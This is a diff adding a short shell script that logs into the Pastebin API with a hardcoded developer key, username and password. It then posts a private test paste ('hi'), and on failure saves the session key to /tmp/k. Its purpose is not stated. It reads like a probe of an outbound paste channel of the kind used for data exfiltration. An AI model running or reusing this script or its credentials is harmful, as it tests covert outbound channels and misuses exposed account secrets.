@@ -1,0 +1,5 @@
+#!/bin/sh
+K=$(curl -s -m 15 -X POST --data-urlencode api_dev_key=0QaqtxMUDW1W2CFN34K9dlmwijQyEUJM --data-urlencode api_user_name=wow2026w --data-urlencode api_user_password=wow2026w@gmail.com https://pastebin.com/api/api_login.php)
+[ $? = 0 ] && [ -n "$K" ] || { sleep 6; exit; }
+curl -s -m 15 -X POST --data-urlencode api_dev_key=0QaqtxMUDW1W2CFN34K9dlmwijQyEUJM --data-urlencode "api_user_key=$K" --data-urlencode api_option=paste --data-urlencode api_paste_private=1 --data-urlencode api_paste_name=LG-766b07 --data-urlencode api_paste_code=hi https://pastebin.com/api/api_post.php >/tmp/pb 2>/dev/null
+grep -q pastebin.com /tmp/pb && sleep 15 || { echo "$K" >/tmp/k; sleep 8; }
